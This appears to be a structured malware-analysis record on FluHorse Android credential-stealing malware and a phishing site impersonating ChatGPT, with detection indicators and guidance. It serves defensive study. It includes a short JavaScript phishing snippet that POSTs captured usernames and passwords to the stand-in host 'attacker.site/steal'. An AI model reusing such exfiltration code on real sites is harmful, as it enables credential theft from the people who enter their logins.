package_info.why_malicious: FluHorse is a malicious Android application distributed via phishing campaigns, designed to mimic legitimate apps and steal user credentials and two-factor authentication (2FA) codes. It abuses permissions to intercept SMS messages and exfiltrate sensitive data to attacker-controlled infrastructure. Additionally, related phishing websites impersonate trusted brands (e.g., ChatGPT) to harvest credentials and distribute malware.

execution_context.trigger: on user login and SMS receipt at runtime
execution_context.file_location: Android application main activity and SMS receiver components (FluHorse APK)

malicious_snippets.code_behavior: At runtime, the code intercepts user credentials entered during login and 2FA codes received via SMS, then exfiltrates this data to an attacker-controlled server via network requests, enabling credential and authentication code theft.

malice_analysis.why_suspicious: The code captures sensitive user input (credentials) and intercepts SMS messages containing 2FA codes, then sends this information to an external, attacker-controlled server. This behavior is characteristic of credential-stealing Android malware.
malice_analysis.violated_expectations: Legitimate Android applications should never access or transmit user credentials or 2FA codes to untrusted servers. Accessing SMS and contacts without clear user benefit, and exfiltrating this data, violates user privacy and platform policies.
malice_analysis.similar_legitimate_use: Legitimate apps may request SMS or contacts permissions for features like auto-filling verification codes or messaging, but they only transmit such data to their own secure backend, not to unknown or suspicious domains.
key_indicators: Harvesting of credentials and 2FA codes from user input and SMS
Network communication to attacker-controlled or untrusted domains
Abuse of SMS, contacts, and phone state permissions
Presence of code to intercept and forward SMS messages

execution_context.trigger: on phishing form submission at runtime
execution_context.file_location: malicious phishing website impersonating ChatGPT (HTML/JavaScript frontend)

malicious_snippets.code_snippet:
<script>
// Pseudocode for phishing form
function onFormSubmit() {
  var user = document.getElementById('user').value;
  var pass = document.getElementById('pass').value;
  fetch('https://attacker.site/steal', {method: 'POST', body: {user, pass}});
}
</script>
malicious_snippets.code_behavior: At runtime, when a user submits the phishing form, the code collects the entered credentials from the DOM and sends them via a POST request to an attacker-controlled server, enabling credential theft.

malice_analysis.why_suspicious: The code is designed to harvest credentials from a fake login form and exfiltrate them to a non-official, attacker-controlled endpoint. This is a classic phishing technique used to compromise user accounts.
malice_analysis.violated_expectations: Legitimate ChatGPT or brand-related sites should only process credentials through official authentication flows and endpoints. Sending credentials to untrusted or unknown domains is never acceptable.
malice_analysis.similar_legitimate_use: Legitimate login forms transmit credentials to secure, official authentication servers over HTTPS, not to arbitrary or suspicious domains.
key_indicators: Credential collection via web form fields
Outbound POST requests to non-official or attacker-controlled domains
Impersonation of trusted brands (e.g., ChatGPT) in website content

attack_chain.action: Victim is lured to install a malicious Android app mimicking a legitimate application (FluHorse) or to visit a phishing website impersonating ChatGPT.
attack_chain.leads_to: Execution of credential and 2FA code theft routines.

attack_chain.action: Malicious code executes at runtime, harvesting credentials and sensitive information from user input and SMS messages (Android) or from phishing web forms (website).
attack_chain.leads_to: Exfiltration of stolen data to attacker-controlled infrastructure.

attack_chain.action: Exfiltrated credentials and 2FA codes are used by attackers for further compromise, such as account takeover, fraud, or resale on dark web forums.
attack_chain.leads_to: Final goal: credential compromise, account takeover, or financial theft.

behavioral_signatures: Android applications requesting sensitive permissions (READ_SMS, RECEIVE_SMS, READ_CONTACTS, READ_PHONE_STATE) and initiating network connections to untrusted or non-official domains
Websites impersonating ChatGPT or other brands with credential collection forms and outbound POST requests to domains not associated with the legitimate service
Presence of code to intercept SMS messages and forward their content externally
file_indicators: APK files with package names or icons mimicking popular apps but signed by unknown or untrusted developers
Web pages with login forms hosted on domains not matching official ChatGPT or brand domains
AndroidManifest.xml files declaring excessive permissions (e.g., READ_SMS, RECEIVE_SMS, READ_CONTACTS)
network_indicators: Outbound HTTPS or HTTP connections from Android apps to attacker-controlled domains (not official app vendor domains)
POST requests containing credentials or SMS content to non-official endpoints (e.g., https://attacker.site/steal)
DNS queries for domains newly registered or associated with phishing campaigns
detection_knowledge.how_to_detect: Monitor for Android applications that request sensitive permissions and establish network connections to untrusted servers. Analyze APK signing certificates for unknown issuers. Detect web pages impersonating trusted brands with credential collection forms, especially if POST requests are sent to non-official domains. Use network monitoring to flag exfiltration of credentials or SMS content, and employ brand impersonation and domain reputation checks for phishing sites. Correlate behavioral, file, and network indicators for automated detection and response.
